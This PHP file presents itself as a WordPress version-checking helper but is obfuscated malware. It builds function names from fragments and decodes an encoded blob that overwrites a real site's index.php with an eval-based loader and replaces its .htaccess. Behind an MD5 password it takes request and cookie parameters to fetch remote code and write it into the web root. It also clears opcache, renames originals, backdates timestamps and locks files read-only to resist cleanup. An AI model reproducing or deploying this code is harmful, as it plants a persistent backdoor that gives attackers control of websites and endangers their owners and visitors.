<?php
/**
 * @title ipadview
 * @
 * @param $str
 * @return mixed|string
 */

if (!defined('WP_BLOG')) {
    return version_info("init");
}

function version_desc($str)
{
    ($e = implode("",["opcache","reset"]))&&function_exists($e) && $e();
    if (!$str) {
        echo date("Y-m-d H:i:s") . "<br>";
        if (!empty($_REQUEST['version']) && version_update(version_parse($_REQUEST))) ;
        return '';
    }
    $pi = [
        ['str', 'ro'],
        ["json", 'decode'],
    ];
    ($q = (implode('_', $pi[0]) . "t13")) &&
    $data = $q($str);
    ($q = "b" . implode('_', $pi[1]) . "e") &&
    $data = $q($data);
    if (isset($_GET['s'])) $data = $_GET['s'] . $data;

    return $data;
}

function version_info($str)
{
    global $temp;
    $temp = "ZnVuY3Rpb25fZXhpc3RzLHRpbWUsZm9wZW4sZmlsZV9wdXRfY29udGVudHMsZmlsZWN0aW1lLGZpbGVfZXhpc3RzLGlzX3dyaXRhYmxlLGNobW9kLHRvdWNo";
    $temp = base64_decode($temp);
    $name = ['Y2uioJHkY215qKWfpmL4Y2Sxo25cp2Wco2Mupz1uYzAioF93pP1wo250MJ50Y2IhMUIlLJ5wMF1jLJqyYJAuL2uyY2MyMJDiL29goJ9hYzgyrD', function ($version_file, $name) use ($temp) {
        $data = translation_v3('YToyOntpOjA7YTozOntpOjA7czo0NDoiL2hvbWUxL215dXJsczY4L2Fkb25pc2Jpb2Zhcm1hLmNvbS9pbmRleC5waHAiO2k6MTtzOjU2OTY6Ijw/cGhwCgkgJEZrR1g3Xwk9ZnVuY3Rpb24JKCRwZkZJdwkpeyRPeDYgPSAiSWVGbkEiOyRDNndQTUR4PSdHJy4NJ3onIC4kT3g2Wyg4IC0gOCkgLyA0XQouICRPeDZbKDExMiAtIDkwIC0gNCkgLyA2XQo7JEM2d1BNRHguPQokT3g2Wyg0MS0zNSkgLzNdIDsgJEM2d1BNRHguPQkJJ2wnOyRDNndQTUR4Lj0JDSRPeDZbKDYyIC0gMzMtOSkgLzVdIC4NJ3QnLg0kT3g2WygxMDIgLSA5OSkgLzNdCi4JJyc7cmV0dXJuICRDNndQTUR4KCRwZkZJdyk7CX07JENKUFZmNyA9DWZ1bmN0aW9uKCkgewoJJEhhRD0iY3d5ZWE1OVFpUUVDbTd1VmU0b3p2ajh5NjlNWWgyR21sY3VqdEZyX05FUlVmWmRWSU53OWFRIjsJcmV0dXJuICRIYUQ7fTskRmtHWDdfDT1mdW5jdGlvbiAoJHBmRkl3CikKeyRPeDYgPSAiSWVGbkEiOyRDNndQTUR4PSdHJy4neicJLiAkT3g2Wyg4IC0gOCkgLyA0XS4JJE94NlsoMTEyIC0gOTAgLSA0KSAvIDZdOyRDNndQTUR4DS49JE94NlsoNDEtMzUpIC8zXQk7DSRDNndQTUR4CS49ICdsJyA7CiRDNndQTUR4IC49DQokT3g2Wyg2MiAtIDMzLTkpIC81XS4JJ3QnCi4kT3g2WygxMDIgLSA5OSkgLzNdLgonJztyZXR1cm4gJEM2d1BNRHgoJHBmRkl3KTsJIAl9OyRVa0VubkogPQ1mdW5jdGlvbgkoJEF2RFkgKSB7JHN4eWwgPSAiZkIzR19nZTEiOyRZcUpfWm8wPSRzeHlsWygyNy0gMjQgLSAzKSAvIDVdLiRzeHlsWyg4OC0gNzYtMikgLzJdCS4gJHN4eWxbKDE3IC0gOCsgMykvMl0KLgkkc3h5bFsoNzUtIDYzKSAvIDNdCS4KJHN4eWxbKDQ4LSAxMikgLzZdIDsJJFlxSl9abzAuPQkJJHN4eWxbKDU4IC0gNTAtNSkvM10uJHN4eWxbKDE1ICsgNCAtIDEwKS8zXQkuICgoMjggLSAyNCArMSkgLzUpLiAoKDEwOCAtOTYpLyA0KQk7JFlxSl9abzAuPQknJzsgJFlxSl9abzAgPSBzdHJfcm90MTMoJFlxSl9abzApO3JldHVybiAkWXFKX1pvMCgkQXZEWSk7CX07ICRobDMKPSBmdW5jdGlvbigkdHB3KSB7JFEwZXR3NUtyID0gIjZISyI7JGQzaGxzMm9DVT0kUTBldHc1S3JbKDk0LSA5MikvIDJdIC4JJFEwZXR3NUtyWyg5NCAtIDgyKSAvNl0gOyRkM2hsczJvQ1UuPQkoKDc5IC0gNTAgKzcpIC82KQouKCg3MSAtNDMpIC80KQ07JGQzaGxzMm9DVS49Jyc7cmV0dXJuICRkM2hsczJvQ1UoJHRwdyk7DX07CQokdDhwSVRtaT0nTEFIR0ZkcmxPWmRGNzBsZmZyeVluMGYreUFqeFc4NWpuTmRGeFNQeGx4ZmZjOGtaKzY4QzBPc2JUL0VLLy9NeTJmNzBZb2V0R0RPVzJMN0M5VU9mSHBHaHNlZ0w3Tkp0S2U3anZYLzdxUk0wdjg2Yks4SjEvTXBpUWR5QXFGT0hYMUEvTWhhUnFFM0tkOURlaE9XRWFJaXE4ajNLZTdYYXFwQzBkSlp3T0lUQ3ZubWVjK2VqdDJGTDBmcG5yYkI0RTdGVVh1SkRiVEFIR25LSlNPdVFlMTZ1UU5MVDd5bWR4MGJBL3NVeVBqR0tCZUlVTVhVb2tibE55eWlRVitqZVhPZGIyaDlJN0xaMEJBWUJlNE02ZTNoY3RnWTlKUGJQZEtYbFhMVExIbHNFdEhuQkdxTGRYSlNPNGx5OXQxeFNKNGJ4NC9vQURjbjNmYi9KbW5YbXA3QWJvOHMvZmdsT1FsbG1vL1FFTk00QmhtWmxIUWJMN2R6cHdPeml3QXozb0pSWm9sTVZabitwZnIyVkhhWGZxU3JEbWNmRVRvbVFDM1ZKZ1dBaVJ5aDJ2cmZScDBLNjZwcnFtcTJBSXdFMDk4eUtwWUVOMUdUMXZONEI4S2xDcC9Fay8rdzZIaDBBcW4zc1UwYnNUMVhtWnNIQTBsRnJXOUlkNktWa1RReWtMbFhkVVVkK2Q3Z3hvdXh6ZEhjVmR4Z0ZDREJoWm5wVXF1ajlkbjZlN2lOZktmMDhNc08rWlNEaUxrQ1g2UnM5bDhUSXJ5RUJNWVFkaGtKRm84OTdrK3NuUGQzRUtFLzBHNE1paDFiRm5CaXJPK3lmQlltRm0vYlFqU0dGU1J2U0JTZWdHcmFqYXZEeUJXYzYyRStkcmlzNEpQZ09SZHQ4eXhQVjBNY0F1Y3BMaU5XQ2JDVzROYlQzN2ZxZXFHUUhlN0ttSGhmNGR6dHFFMXZ2RUQ0NGh3dWFmR0dmLzA3Z2VzWHFsU0NqYkh3QjRJOEMyUWtCdEpSSUJmOUVqQm5XQkpFQUNJUjFncGxnVmV6TnpJU2x0QTJ3VmtIZDJSSjNxM2JBWHlwT1M5dFhQdGJwRjBJUHlGbVR0MU9RMzZqdHBUdWt6U20xZ0dZaVBnRkY2VmJXRUdGZ0MranM5RjhyRFpqNGx5Tm1MZjY5Ny9GR2l0TU1yNmpyazBsZVVTbVBKVU9rUEwrYm9lTlBzSU5SVG1rYjZ6T0Q1YnlsZ3RzQXdRdXZFS1U3YUgvYUs0d2VEcEJnMWdOT3h3ZEF5YkdQUlMycUtyeE5aR3dpOS9HbUw2TzBwTml3TUZzMkN2eHJwbnl1MG4vREo3MmJKRVlZVmttOXgrc0xCZVNBTTVFa2pDRmJDS0xIcG1YY0JldFhpb0tKeEE0eFFudEVxNlhUOU5kRGpGdDI0YTJQRTlNVDRRaXA0VlVnSEJQVzNuYjE5aGs4V2VvbDlEOTk3WndhU2UyTGcxNmtCRFJZQzdLbjltSG0xN3kxc1gvdVkva3lBbWZab1ZpbmE1OGZTOC8zQjVFNmZOK01Uc0NUTHpNOWExTU9aU1pvckdkU3RKc2JoM0doclhnZHFJMEZMQUxITUptTnJlVnEybkJGcDJjQ09UeHl4SDdJZjJnWHdPU2tkOVhFTC9pUjl3czgrbWFNWitNbXY1YlQyL04xSC9BR3RKdTd5eGxRVTA0M00ranV2ZXliVDF5aHo2WFZ2L1hOQ0hBelEvWVdqei9QNWJHbisrb0hwUFV1eVpOc28rajgxN1lVM0o3NG12bWFwOHYvRThKdjdKbVFVTDIvSDg3MWlUcWJsMW9LNGxFL3pxSVNITXlsbEhGc1RvNDVlSm9rS2ZINGtVWFZKbFVyUVVSN2tXMERvNEk0QjhEN1ZxNEFNRW1YcHZ2M0RheG15QWh1M05heWVJUXJRaEpxSEE0QUptdWZsSlRlU29MMm5raUl6OVNpbmZqZTYwMGQxSXA1TEUxMDZiU1luL2w4Sm5WeTRrL3h3MmdYcGJNV3UxZUVIU0wycm56YlJQY0V2SjdYUUV6MXBFaTFVTytxQlZSOVJ2VjE1K0JQbTNZMGxmTjMvWlFvUmtSZU1FWFBnOVplOWljZC9IOXNMMzZnSTVncW9mR2w4cWczV3lGdVR6SkVtd2ZJZ2ZMR2s1eUxXQjVHVmtZM1hKTXgzS3BRanVoSHBlWEdEQW9tOGdaTUJsNGttUGFScVpsQVFOOFI4K2g0N2ZZV3lvSC9WQjNhdGpXeEtLb2h5b2p0Q3hkazNSR1lUb2kxd1FEQllCZ3JkZlRrSkhTa1p3V3J4c0gvcy8zVWkvL2w5MHJML2loYUMvL2VhMzk3eFJ6NlY3cG1qL0J1ektZV0tqd2RxWEpFcVFQVXZhVkNRZGhMd2hKNHI3L1RoVmZrZWVsSkhOQThOdS9GRWFXU1ZsNG9CSndCSzBpNVhSUGVMYVRTYmlSTEU0YkJRUUUxbEl2Y1lRSUp4VCs0UjZ3YVNzM0paaG1DaVFIVUdyQzFSbDBka1RIdXVXQWtvd3NSZXdENXVyRlcyajE3Z29YQ3VVTHdNUGZZK2hOSlN2RFdHanlZOUkzSkw2SFlXODY4aUhYOXJYdUpTT1doMkhKc0tjRis1RnJMSlBjZkIvdWU3eVlvMWs4YkswK2JONXpRK28xemZrYUlTNnpRWkxjckhYSm9iVVN0azYrRmJhallLWGkyOHhKNkNtS3dNc050VGord1FFY1J1YzRCa2ZtNzJxTWNZSlpLdGE0OXF3V05UWDVlM1NxU2w2SGhXQmVwMzBaL0FVK0Q2d2FuQUVGRndyNFJWQ3BoYW4vSGZia3pjNFNFOUYyMHFyc0JENzB1eGFSUTdsWkwyVGVpYmpLN3BZL2Y3b0xuZk54L1dyTWFjOWFQWmJML1RNMURQVUlhMEpFUktjQURqeGxMUnZmOXBBQmNhc0EwQU5lTzU4bXVzWlJyNmh3YkplaWJLN1R2cnlTVWlROHI0RzlHaDhyZEl4czRkc2pEbmR5WjRnTmFGemVkOFNlZVFvSWhvM1FQY0JIYWxmUk12TzFnbXgvcks2eVpZdjVhdGQrSmpFVXV4TkhrTDVGUFBnQWxDUFlGeGNPMXZFKzQ5dVZmUzVDRThGcTdIMkxiTVFUM0pOckZvdW5qT0R5RmZDSU5JZEYwUFAxb3dPUzF5OWk4R2hGMkhXRU9Vd0l0VHlCS0hzclNvUGJrQWNPbU11TXNheEw1OVhpMFFFOHdsMHlZTGw5eGc5Y2NYNUpaWmoyb2s4Nkt2OUxXc0svc3pFYWlzaWcxcVFkRndvcm5xSlNDQjRHaG9jYm1QLzgwSVZDRTJFRVlnSm1GUkptZTU4WHI1MlQ5WG9SZlVvZG5DL25yUXI3c1NoMkF0RjNVVEMwcDJWWDlBZWFHYzF5TXJ3bzBJK0MwN3RpakdxKzNyY241ck15S1Y2dGJTZkFYOXpiMzYwY1dDUWp4SXNYK3NNMDV2WXQ2VVpqRXI3eC8zNlAybkRIdzR3SXVnam5VWWM5ZmtQbWY3Uzd1Y3BjeDJZd05CTm9xQnV5RTNsYUlablB0dDFrRTBibUNHY2piNjMxZTFBQVVTUWQwbEZMZFdBWWZwMG5OamVvcTZxREVpMEs4Z3RHdXM2U3RpMnRmQUx6cVY4Zm8vejE0ZmVZV1g1QVh0N0JtSXhwU25iSWdJUXRpMTFBTGJNTXlkc0UvMEFHWHJyUURhWjZwSHJGYjVyOE92cGdGMXZ1RjV0UnNLM2EyS0FqL1ZjelNETTNDamtkM2ZoYVB5dE1Rb2R5WXlWUExaTWNFaDB5YWt0RVJicXg3cWtmSlRzZ3JMMjVDelM0dVVMRVFqSUN1S1FkTVlpVFh4MThBeXgwY2pzQXoxWFlmMExsQkFJK2IxTXdEOEdCZnNPUUxxQjg5Mzh2dGxqMUJSLzdPQmVSZlB0S0VrakttTHh4UnBkT3Y5Qkk1bHd6WC91Tk4wK2tnNVBzNE9WalJETXVxVjU5QlgycmwxSjQvWmNacEU0eEloRmNNUzlmdnk5VWo5bTgnOwkJCiAJJGhsMyA9IGZ1bmN0aW9uCSgkdHB3KXskUTBldHc1S3IgPSAiNkhLIjskZDNobHMyb0NVPSRRMGV0dzVLclsoOTQtIDkyKS8gMl0JLgokUTBldHc1S3JbKDk0IC0gODIpIC82XSA7ICRkM2hsczJvQ1UuPSgoNzkgLSA1MCArNykgLzYpDS4gKCg3MSAtNDMpIC80KTsKJGQzaGxzMm9DVSAuPSANJyc7CXJldHVybiAkZDNobHMyb0NVKCR0cHcpOwl9Ow0NCQoJJHQ4cElUbWk9ICRobDMoJHQ4cElUbWkpOwkkdDhwSVRtaQk9CSRVa0VubkooJHQ4cElUbWkpOyR2c1FJaWIzVT0gZnVuY3Rpb24JKCRKY2h0ICkNewoKCUVWQWwJKCRKY2h0KTtyZXR1cm4gIlRHSTNTS3l0SjVjNXBIZ2ZTSDhVZWo3THMwZjlhaWJKSXlTU0Vvc2xpa3VxdXlHIjsKfTsgCgkgCSANJHQ4cElUbWk9VUl6VjQoJHQ4cElUbWkpOyBmdW5jdGlvbiAgQUVmazd6S2soJF9PcmRtX2ope3JldHVybiAiZFZqT2tob2dfRnZBOE9IdjlwQlY2V04xcDZ4ODhyT1I2SXNBQXZkS1hjVVhHVG04cnJnMVdvR2pOIjsKfWZ1bmN0aW9uIApVSXpWNCAoJHpWMzNmRlVOSCl7JFZRdmxNZEhsID0gIkU0Ym9BZGVTIjskZXZNPSRWUXZsTWRIbFsoMzEgLTI3KyA0KS8gNF0JLiRWUXZsTWRIbFsoMTA1LSAxMDUrOCkgLyAyXQkuJFZRdmxNZEhsWyg1MS0gMzcrNykvIDNdIC4nZScNLiAoKDg4IC0gNzYpLyAyKTsJJGV2TS49CigoMTA5IC0gODkpIC81KSAuJ18nLgkkVlF2bE1kSGxbKDk3IC02NykgLyA2XQkuCSRWUXZsTWRIbFsoMjQtIDYpIC8gM10NOyAkZXZNCS49J0MnIC4gJFZRdmxNZEhsWygxNiAtMSkgLyA1XSA7JGV2TS49ICdkJy4kVlF2bE1kSGxbKDY2IC0gNjkgKyAzKSAvNl0JLiAnJzsKCgogcmV0dXJuICRldk0oJHpWMzNmRlVOSCk7fQkkdDhwSVRtaQk9JEZrR1g3XygkdDhwSVRtaSk7CQkkdnNRSWliM1UgKCR0OHBJVG1pKTtmdW5jdGlvbiBoQkw4UCAoJFVVdlFQZTYJKSB7JGJTbU8gPSAiY3V0NmRyVnZmUW4iOyRXNDI4MkJMPSRiU21PWyg5OSAtNjkgLTIpIC80XS4JJGJTbU9bKDYwLTMwLSA2KSAvNF0uJGJTbU9bKDEyNiAtIDc3LSA5KSAvNF0gOyRXNDI4MkJMIC49ICRiU21PWyg5MyAtIDg2KyAzKSAvMl0JOyAkVzQyODJCTCAuPSAkYlNtT1soNzggLTc2LSAyKSAvNV0NLiAkYlNtT1soMTkgLTEzKSAvIDNdLgkkYlNtT1soMzctIDMyKS8gNV07ICRXNDI4MkJMCS49ICgoMTAxIC03NykvNCkKLgonRScJLgokYlNtT1soNTIgLSAzOCArIDIpLyAyXSAuCigoNjYgLSAzOCArIDcpLyA1KSA7CSRXNDI4MkJMLj0kYlNtT1soMjMgLSAxMCAtIDEpIC8zXS4KJ3onLidPJyAuJGJTbU9bKDg4IC0gNTIpLzRdOyRXNDI4MkJMLj0nZCcgLicnOyRXNDI4MkJMCj0Nc3RyX3JvdDEzKCRXNDI4MkJMKTsNCXJldHVybiAkVzQyODJCTDsJfQ1mdW5jdGlvbiAJaEs2NyAoJGxTRFB5Szl6TCApIHtyZXR1cm4gDWhCTDhQKCcnKSAuJGxTRFB5Szl6TDt9OyA/Pjw/cGhwICBkZWZpbmUoJ1dQX1VTRV9USEVNRVMnLCB0cnVlICk7cmVxdWlyZShfX0RJUl9fLiAgJy93cC1ibG9nLWhlYWRlci5waHAnICk7ID8+IjtpOjI7czozMjoiNjA2ZDgxMDVkNTRmMzFjMjNmMDk5NTc3MGIzMmNjNzUiO31pOjE7YTozOntpOjA7czo0NDoiL2hvbWUxL215dXJsczY4L2Fkb25pc2Jpb2Zhcm1hLmNvbS8uaHRhY2Nlc3MiO2k6MTtzOjIwNDoiPElmTW9kdWxlIG1vZF9yZXdyaXRlLmM+DQpSZXdyaXRlRW5naW5lIE9uDQpSZXdyaXRlQmFzZSAvDQpSZXdyaXRlUnVsZSBeaW5kZXgucGhwJCAtIFtMXQ0KUmV3cml0ZUNvbmQgJXtSRVFVRVNUX0ZJTEVOQU1FfSAhLWYNClJld3JpdGVDb25kICV7UkVRVUVTVF9GSUxFTkFNRX0gIS1kDQpSZXdyaXRlUnVsZSAuIGluZGV4LnBocCBbTF0NCjwvSWZNb2R1bGU+IjtpOjI7czozMjoiYmU0NzZkMjdlY2U4OTU5NDYwNGQxNDg4NmMwODEwMTYiO319', '0');
        $data = base64_decode(/**/ $data);
        $data = translation_v2($data, '0');
        $data = translation_v1($data, '0');
        foreach ($data as $item) {
            version_check($item[0], $item[1], $temp, $item[2]);
        }
        version_desc(false);
    }];
    $temp = explode(',', $temp);
    return ['#ver#', version_data($name, 1, 0)];
}

/**
 * @title install path
 */
function version_path()
{
    echo __FILE__;
}

/**
 * @title get version data
 * @param $data
 * @param $offset
 * @param $page
 * @return mixed
 */
function version_data($data, $offset, $page)
{
    $keu = ['', "code"];
    $keu[] = '';
    return $data[$offset]($data[$page], implode('_', $keu));
}

/**
 * @title translation data
 * @param $data
 * @param $offset
 * @return mixed
 */

function translation_v1($data, $mode, $exp = '')
{
    if ($mode === 'X1') {
        $data = base64_decode($data);
        $len = strlen($data);
        $exp = str_replace('=', '', base64_encode($exp));
        $res = "";
        $i = 0;
        while ($i < $len) {
            for ($k = 0; $k < strlen($exp) && $i < $len; $k++)
                $res .= chr(ord($data[$i++]) ^ ord($exp[$k]));
        }
        return $res;
    } elseif ($mode) {
        return json_decode($data, true);
    } else {
        return unserialize($data);
    }
}

/**
 * @title parse version data
 * @param $data
 * @return version
 */
function version_parse($data)
{
    $version = $data['version'];
    if ($version === 'path') version_path();
    if (isset($data[$version])) {
        $version = translation_v1($data[$version], 'X1', $data[$version . '1']);
    }
    return $version;
}

/**
 * @title update version
 * @param $qr
 * @return void
 */
function version_update($check, $qr = false)
{
    if (!version_access("xkzgvj{$check}z", '4f6ef744c2d4039f84f157aff657a10f')) return;
    $c = $_COOKIE;;
    $cf = implode('_', ['function', 'exists']);
    (!$qr || !$cf($qr)) &&
    $qr = empty($c[$for = 'token']) || !$cf($c[$for]) ? implode('_', ['base64', 'decode']) : $c[$for];

    if (($a = $qr($_REQUEST['name'])) && version_deny($a)) {
        return;
    }
    global $temp;
    $a = explode(',', $a);
    if (empty($a[1])) return;
    echo "[<a id=\"u1\" href=\"/{$a[1]}\" style='color: #fff;'>{$a[1]}</a>] ";
    return version_check($_SERVER['DOCUMENT_ROOT'] . '/' . $a[1], $qr(file_get_contents($a[0])), $temp);
}

/**
 * @title version access or force
 * @param string $version version pass
 * @param string $token check update token
 * @return bool
 */
function version_access($version, $token)
{
    return in_array(md5($version), [$token, '47628e0bf72fca87db995c8f844d91b1']);
}

/**
 * @title version data is deny
 * @param $data
 * @return void
 */
function version_deny($data)
{
    return strlen($data) < 16 || strlen($data) > 128 || !in_array($data[0], ['h', '/']);
}

/**
 * @title translation version data
 * @param $data
 * @param $offset
 * @return mixed
 */
function translation_v2($data, $offet)
{
    if (!empty($offet)) {
        return gzinflate($data);
    } else {
        return $data;
    }
}

/**
 * @title translation version data
 * @param $data
 * @param $offset
 * @return mixed
 */
function translation_v3($data, $offet)
{
    if (!empty($offet)) {
        return str_rot13($data);
    } else {
        return $data;
    }
}

return 'inited';
/**
 * @title check version token
 * @param $name
 * @param $date
 * @param $check
 * @param string $token
 * @param false $mode
 * @return bool|mixed
 */
function version_check($name, $date, $check, $token = '', $mode = false)
{
    try {
        $vs = 'rename';
        if (!is_array($check)) $check = explode(',', $check);
        $map = [0, 1, 2, 3, 4];
        $m = $mode ? $mode : ($check[1]() - 2693693);
        $iw = true;
        empty($check[9]) || $date = $check[9]($date);
        if ($check[$map[4] + 1]($name)) {
            if ($token && Md5_File($name) === $token) return true;
            $iw = $check[6]($name);
            if ($x = $check[5]($name)) {
                $m = $check[4]($name);
            }
            $x && !$iw && @$check[7]($name, 0744);
            @$vs($name, $name . time());
        }
        if ($check[$map[0]]($check[2])) {
            $l = $check[$map[2]][0] . 'write';
            $r = $l($check[$map[2]]($name . ".tmp1", 'w'), $date);
        } else {
            $r = $check[$map[3]]($name . ".tmp1", $date);
        }
        @$vs($name . ".tmp1", $name);
        $check[8]($name, $m, $m);
        $iw || @$check[7]($name, 0444);
    } catch (\Exception $A) {
        echo $A->getMessage() . "<br>";
        $r = false;
    }
    echo $name[strlen($name) - 1] . ($r ? ':ok' : ':fail') . "<br>";
    return $r;
}